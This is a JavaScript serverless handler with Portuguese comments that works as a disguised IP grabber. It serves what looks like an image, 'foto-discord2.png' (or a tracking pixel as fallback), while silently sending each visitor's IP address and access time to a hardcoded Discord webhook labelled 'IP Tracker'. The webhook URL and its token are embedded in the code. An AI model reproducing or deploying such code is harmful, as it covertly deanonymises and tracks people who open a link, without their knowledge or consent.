import fs from 'fs';
import path from 'path';

export default async function handler(req, res) {
  // 1. CAPTURA IP
  const ip = req.headers['x-forwarded-for']?.split(',')[0].trim() || 'IP não detectado';
  
  console.log('🎯 IP CAPTURADO:', ip);
  
  // 2. ENVIA PARA DISCORD WEBHOOK (CORRETO)
  const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1456767774368993380/-412QnxkT_spPdRfKW2uuhMevQM23-v7XGR9yjOfz0ymAg7ooyJZ85kBILbzAEiaIZQ-';
  
  try {
    console.log('📤 Tentando enviar para Discord...');
    
    const resposta = await fetch(DISCORD_WEBHOOK, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        content: `📸 **foto-discord2.png ACESSADA**\n🌐 IP: \`${ip}\`\n🕐 ${new Date().toLocaleString('pt-BR')}`,
        username: 'IP Tracker',
        avatar_url: 'https://cdn.discordapp.com/emojis/🖼️.png'
      })
    });
    
    console.log('✅ Discord Status:', resposta.status);
    console.log('✅ Discord OK:', await resposta.text());
    
  } catch (error) {
    console.log('❌ ERRO DISCORD:', error.message);
  }
  
  // 3. ENVIA A FOTO
  try {
    const fotoPath = path.join(process.cwd(), 'public', 'foto-discord2.png');
    const fotoBuffer = fs.readFileSync(fotoPath);
    
    res.setHeader('Content-Type', 'image/png');
    res.send(fotoBuffer);
    
  } catch (error) {
    console.log('❌ Erro foto:', error.message);
    
    const pixel = Buffer.from(
      'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==',
      'base64'
    );
    
    res.setHeader('Content-Type', 'image/png');
    res.send(pixel);
  }
}
